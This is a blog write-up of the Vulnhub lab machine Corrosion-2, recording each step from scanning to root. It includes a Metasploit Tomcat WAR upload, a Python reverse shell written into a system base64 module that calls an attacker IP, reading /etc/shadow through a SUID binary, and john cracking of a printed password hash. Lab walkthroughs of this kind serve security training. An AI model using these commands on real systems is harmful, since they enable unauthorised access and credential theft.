---
title: Vulnhub - Corrosion-2 | EN
author: batmanly
date: 2023-04-16 10:10:00 +3
categories: [Writeup, Vulnhub, Corrosion]
tags: [web, writeup, vulnhub,zip_cracking, john, previlege_escalation, python_reverse_shell, tomcat, war_shell ]
render_with_liquid: false
---

# Information

## Room
-   **Name:** Corrosion-2
-   **Profile:** [Corrosion-2](https://www.vulnhub.com/entry/corrosion-2,745/)
-   **Difficulty:** Medium
-   **Description**: Hint: Enumeration is key.

# Write-up

## Overview

It was enjoyable room , i liked the way to use python module and escalate privileges . it's also show how it's important keep backup file save , if someone get this backups he can utilize and hack our system . 

# Enumeration

after import machine VirtualBox , we can use `arp-scan` to find ip address of machine .
```bash
sudo arp-scan -l -I ens36
```
after finding ip we can start scan network .

## Network Enumeration

### Nmap Scanning

i commonly use Nmap for network scanning, so let's run Nmap and examine that results.
```bash
sudo nmap -sV -T4 -sS -v -Pn -p- 192.168.238.10 -sC -oN nmap
```

Results:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6ad8446080397ef02d082fe58363f070 (RSA)
|   256 f2a662d7e76a94be7b6ba512692efed7 (ECDSA)
|_  256 28e10d048019be44a64873aae86a6544 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat 9.0.53
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.53
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: 08:00:27:D8:3B:AB (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

it's look there is three port is open , we can start looking at tomcat version vulnerability. i didn't any tomcat vulnerability , let's look web server at port 80.


# Web Enumeration

## Nuclei over Tomcat
After i run Nuclei over tomcat , i found interesting zip as named backup.zip, i downloaded it has password security let's crack this password with john.
```
nuclei -u http://192.168.238.10:8080/
```

```
http-missing-security-headers:access-control-allow-headers] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:access-control-max-age] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.238.10:8080/
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://192.168.238.10:8080/
[public-tomcat-manager] [http] [info] http://192.168.238.10:8080/manager/html
[pgsql-detect] [tcp] [info] 192.168.238.10:8080
[samba-detect] [tcp] [info] 192.168.238.10:8080
[tomcat-scripts] [http] [info] http://192.168.238.10:8080/examples/jsp/index.html
[tomcat-scripts] [http] [info] http://192.168.238.10:8080/examples/websocket/index.xhtml
[tomcat-scripts] [http] [info] http://192.168.238.10:8080/examples/servlets/servlet/SessionExample
[tomcat-exposed-docs] [http] [info] http://192.168.238.10:8080/docs/ [Version 9.0.53,]
[favicon-detect:apache-tomcat] [http] [info] http://192.168.238.10:8080/favicon.ico
[waf-detect:ats] [http] [info] http://192.168.238.10:8080/
[waf-detect:apachegeneric] [http] [info] http://192.168.238.10:8080/
[ibm-d2b-database-server] [tcp] [info] 192.168.238.10:8080
[tomcat-detect] [http] [info] http://192.168.238.10:8080/ [9.0.53]
[options-method] [http] [info] http://192.168.238.10:8080/ [GET, HEAD, POST, OPTIONS]
[tomcat-manager-pathnormalization] [http] [info] http://192.168.238.10:8080/2P0JOo9F8EOdkieMXq6E1ltk7Wf/..;/manager/html
[zip-backup-files] [http] [medium] http://192.168.238.10:8080/backup.zip [FILENAME="backup",EXT="zip"]
[openssh-detect] [tcp] [info] 192.168.238.10:22 [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3]

```

```
http://192.168.238.10:8080/backup.zip
```


### Cracking Zip password with John
First we must get hash of zip than we can give this hash to john for crack.

```
zip2john backup.zip > hash

```

Cracking hash 
```
john hash --wordlist=~/rockyou.txt
```
![[]](/assets/img/vulnhub/corrosion/corrosion-2/img.png)
after find password let's extract zip and examine what's inside this zip.
![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_1.png)

tomcat store user credentials inside `tomcat-users.xml` file let's get inside this file and find password for any admin user. Than we can upload war payload to get reverse shell over the corrision-2 machine.

![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_2.png)

## Web exploitation

we can try this username and password if we can access tomcat server.
![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_3.png)
with admin credentials we can access tomcat server let's create war payload and upload this , than run and get reverse shell.

### Get reverse Shell over Tomcat

we can create war payload with MSFvenom and upload this payload to tomcat , or we can directly use Metasploit for do all this job for us.
i will do with Metasploit you can do another way too.

```
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost 192.168.238.10
msf exploit(multi/http/tomcat_mgr_upload) > set rport 8080
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > set FingerprintCheck false
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_4.png)
now we have a shell , we can move next step to get root shell.


# Privilege Escalation
after get shell we can upload Linpeas and try to find a way escalate privileges.
## Elevation of Privilege : tomcat to jaye
```bash
# On main machin
updog -p 8081 

# Downlaod temp folder on corrision-2 machine
wget http://192.168.238.6:8081/linpeas_base.sh
chmod +x linpeas_base.sh
./linpeas_base.sh
```

we found interesting file on the `root` directory
![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_5.png)
let's investigate 
![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_7.png)
after read this i tried old tomcat password for randy but it didn't successful i look other user and for Jaye user i become successful. let's move on and try to escalate another suer
![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_8.png)

## Elevation of Privilege : jaye to Root

we can run again linpeas at this user. let's see what we will get.
```
wget http://192.168.238.6:8081/linpeas_base.sh
chmod +x linpeas_base.sh
./linpeas_base.sh
```

![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_9.png)

```
/home/                                                                                                                                                                                                             
/home/randy/note.txt                                                                                                                                                                                               
/home/randy/.bash_history                                                                                                                                                                                          
/home/randy/randombase64.py                                                                                                                                                                                        
/home/jaye/.bash_history                                                                                                                                                                                           
/home/jaye/Files                                                                                                                                                                                                   
/home/jaye/Files/look                                                                                                                                                                                              
/root/                                                                                                                                                                                                             
/var/www                                                                                                                                                                                                           
/var/www/html                                                                                                                                                                                                      
/var/www/html/index.html       
```

look's we can write base64.py , we can see root can run randombase64.py , so let's get shell from there.
![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_10.png)

```
/usr/lib/python3.8/base64.py                                                                                                                                                                                       

```

![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_11.png)

we will change base64.py file and write reverse shell inside that , after run randombase64.py we will get root shell 
```
import socket
import subprocess
import os
:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.238.6",4542))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

### Reverse shell with Python Module

open file
```bash
vi /usr/lib/python3.8/base64.py
```

![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_12.png)

than write the code upper inside this file and exit with `:wq` .
after run this we get shell but still we are not root, let's leave this here and start looking around more , we must find a way to run python with sudo without password than we can get root shell.


## Elevation of Privilege : jaye to Randy
![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_13.png)
inside `/home/jaye/Files` we find tool named `look` it has suid bit so let's try to use this tool and get password inside `/etc/shadow ` file .

```
./look '' /etc/shadow
```
![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_14.png)

we can dump password with this , i think it will hard to crack root password so i will try to crack `randy` password than use randombase64.py if it has previleges to run as root , let's move on and see.

### Cracking User password with John
we must first copy hash to any file than use john with wordlist to crack this hash.
```                    
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:
```
copy randy hash inside any file.
```
john hash --wordlist=~/rockyou.txt
```

![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_17.png)

after cracking hash we can this time login as randy and use randombase64.py file if we can , let's check sudoers file and see our permission . 

![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_15.png)

it's look we can run this file as sudo , we already add our shell inside this file , so let's run with sudo and get shell.

## Elevation of Privilege : randy to root
let's start listener and run randombase64.py file with sudo .

```bash
nc -nlvp 4542
```

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py
```

![[]](/assets/img/vulnhub/corrosion/corrosion-2/img_16.png)

![[]](/assets/img/vulnhub/corrosion/corrosion-2/root.gif)
Yep. Now we Got root. Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me.